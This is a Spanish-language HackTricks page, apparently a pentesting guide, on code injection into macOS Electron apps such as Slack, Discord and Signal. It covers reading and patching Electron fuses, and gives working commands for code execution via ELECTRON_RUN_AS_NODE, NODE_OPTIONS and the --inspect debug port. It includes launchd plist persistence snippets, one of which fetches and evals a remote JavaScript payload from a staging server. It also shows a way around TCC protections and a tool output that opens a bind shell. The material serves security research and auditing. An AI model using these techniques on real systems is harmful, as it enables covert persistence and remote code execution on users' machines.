# Inyección en Aplicaciones de Electron en macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Información Básica

Si no sabes qué es Electron, puedes encontrar [**mucha información aquí**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Pero por ahora, solo debes saber que Electron ejecuta **node**.\
Y node tiene algunos **parámetros** y **variables de entorno** que se pueden usar para **ejecutar otro código** aparte del archivo indicado.

### Fusibles de Electron

Estas técnicas se discutirán a continuación, pero recientemente Electron ha agregado varias **banderas de seguridad para prevenirlas**. Estos son los [**Fusibles de Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) y estos son los que se utilizan para **prevenir** que las aplicaciones de Electron en macOS **carguen código arbitrario**:

* **`RunAsNode`**: Si está deshabilitado, evita el uso de la variable de entorno **`ELECTRON_RUN_AS_NODE`** para inyectar código.
* **`EnableNodeCliInspectArguments`**: Si está deshabilitado, los parámetros como `--inspect`, `--inspect-brk` no se respetarán. Evitando así la forma de inyectar código.
* **`EnableEmbeddedAsarIntegrityValidation`**: Si está habilitado, el archivo **`asar`** cargado será validado por macOS. **Evitando** de esta manera la **inyección de código** mediante la modificación del contenido de este archivo.
* **`OnlyLoadAppFromAsar`**: Si está habilitado, en lugar de buscar para cargar en el siguiente orden: **`app.asar`**, **`app`** y finalmente **`default_app.asar`**. Solo verificará y usará app.asar, asegurando así que cuando se **combine** con el fusible **`embeddedAsarIntegrityValidation`**, sea **imposible** cargar código no validado.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Si está habilitado, el proceso del navegador utiliza el archivo llamado `browser_v8_context_snapshot.bin` para su instantánea de V8.

Otro fusible interesante que no evitará la inyección de código es:

* **EnableCookieEncryption**: Si está habilitado, el almacenamiento de cookies en disco se cifra utilizando claves de criptografía a nivel de sistema operativo.

### Verificación de los Fusibles de Electron

Puedes **verificar estas banderas** desde una aplicación con:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modificando los Fusibles de Electron

Como mencionan los [**documentos**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), la configuración de los **Fusibles de Electron** se encuentra dentro del **binario de Electron** que contiene en algún lugar la cadena **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

En las aplicaciones de macOS, esto suele estar en `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Puedes cargar este archivo en [https://hexed.it/](https://hexed.it/) y buscar la cadena anterior. Después de esta cadena, puedes ver en ASCII un número "0" o "1" que indica si cada fusible está desactivado o activado. Simplemente modifica el código hexadecimal (`0x30` es `0` y `0x31` es `1`) para **modificar los valores de los fusibles**.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Ten en cuenta que si intentas **sobrescribir** el binario del **`Electron Framework`** dentro de una aplicación con estos bytes modificados, la aplicación no se ejecutará.

## RCE añadiendo código a Aplicaciones Electron

Puede haber **archivos JS/HTML externos** que una Aplicación Electron esté utilizando, por lo que un atacante podría inyectar código en estos archivos cuya firma no será verificada y ejecutar código arbitrario en el contexto de la aplicación.

{% hint style="danger" %}
Sin embargo, en este momento hay 2 limitaciones:

* Se necesita el permiso **`kTCCServiceSystemPolicyAppBundles`** para modificar una aplicación, por lo que por defecto esto ya no es posible.
* El archivo compilado **`asap`** generalmente tiene los fusibles **`embeddedAsarIntegrityValidation`** y **`onlyLoadAppFromAsar`** habilitados.

Esto hace que esta ruta de ataque sea más complicada (o imposible).
{% endhint %}

Ten en cuenta que es posible evitar el requisito de **`kTCCServiceSystemPolicyAppBundles`** copiando la aplicación a otro directorio (como **`/tmp`**), renombrando la carpeta **`app.app/Contents`** a **`app.app/NotCon`**, **modificando** el archivo **asar** con tu código **malicioso**, renombrándolo de nuevo a **`app.app/Contents`** y ejecutándolo.

## RCE con `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Según [**la documentación**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), si esta variable de entorno está configurada, iniciará el proceso como un proceso Node.js normal.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Si el fusible **`RunAsNode`** está desactivado, la variable de entorno **`ELECTRON_RUN_AS_NODE`** será ignorada y esto no funcionará.
{% endhint %}

### Inyección desde el archivo Plist de la aplicación

Como se [**propone aquí**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), podrías abusar de esta variable de entorno en un plist para mantener la persistencia:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE con `NODE_OPTIONS`

Puedes almacenar la carga útil en un archivo diferente y ejecutarlo:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Si el fusible **`EnableNodeOptionsEnvironmentVariable`** está **desactivado**, la aplicación **ignorará** la variable de entorno **NODE\_OPTIONS** al iniciarse a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también será **ignorada** si el fusible **`RunAsNode`** está desactivado.
{% endhint %}

### Inyección desde el archivo Plist de la aplicación

Podrías abusar de esta variable de entorno en un plist para mantener la persistencia agregando estas claves:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE con inspección

Según [**este**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) artículo, si ejecutas una aplicación de Electron con banderas como **`--inspect`**, **`--inspect-brk`** y **`--remote-debugging-port`**, se abrirá un **puerto de depuración** al que podrás conectarte (por ejemplo, desde Chrome en `chrome://inspect`) y podrás **inyectar código en él** o incluso lanzar nuevos procesos.\
Por ejemplo:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Si la opción **`EnableNodeCliInspectArguments`** está desactivada, la aplicación **ignorará los parámetros de node** (como `--inspect`) al iniciarse a menos que la variable de entorno **`ELECTRON_RUN_AS_NODE`** esté configurada, la cual también será **ignorada** si la opción **`RunAsNode`** está desactivada.

Sin embargo, aún podrías usar el parámetro de electron `--remote-debugging-port=9229`, pero la carga útil anterior no funcionará para ejecutar otros procesos.
{% endhint %}

### Inyección desde el archivo Plist de la aplicación

Podrías abusar de esta variable de entorno en un archivo plist para mantener la persistencia agregando estas claves:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Bypass de TCC abusando de versiones antiguas

{% hint style="success" %}
El demonio TCC de macOS no verifica la versión ejecutada de la aplicación. Por lo tanto, si **no puedes inyectar código en una aplicación Electron** con ninguna de las técnicas anteriores, puedes descargar una versión anterior de la aplicación e inyectar código en ella, ya que aún obtendrá los privilegios de TCC.
{% endhint %}

## Inyección automática

La herramienta [**electroniz3r**](https://github.com/r3ggi/electroniz3r) se puede utilizar fácilmente para **encontrar aplicaciones Electron vulnerables** instaladas e inyectar código en ellas. Esta herramienta intentará utilizar la técnica **`--inspect`**:

Debes compilarla tú mismo y puedes usarla de la siguiente manera:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Referencias

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
